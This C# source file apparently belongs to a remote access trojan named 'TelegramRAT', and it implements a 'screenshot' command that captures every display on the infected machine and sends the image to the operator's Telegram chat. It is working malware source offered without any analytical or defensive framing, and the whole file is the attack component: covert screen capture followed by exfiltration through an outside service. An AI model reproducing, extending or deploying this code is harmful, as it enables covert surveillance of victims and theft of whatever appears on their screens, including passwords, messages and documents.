using Telegram.Bot;
using System.Drawing;
using System.Drawing.Imaging;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Remote;

public class ScreenshotCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IWinApiService winApiService) : AbstractBotCommand
{
    public override string Command => "screenshot";
    public override string[] Aliases => new[] { "screen" };
    public override string Description => "Take a screenshot of all displays area.";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            Rectangle bounds = winApiService.GetScreenBounds();

            using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
            using Graphics graphics = Graphics.FromImage(bitmap);
            using MemoryStream screenshotStream = new MemoryStream();
            graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

            bitmap.Save(screenshotStream, ImageFormat.Png);
            screenshotStream.Position = 0;

            await botClient.SendPhoto(chatId: model.Message.Chat.Id, photo: new Telegram.Bot.Types.InputFileStream(screenshotStream), replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
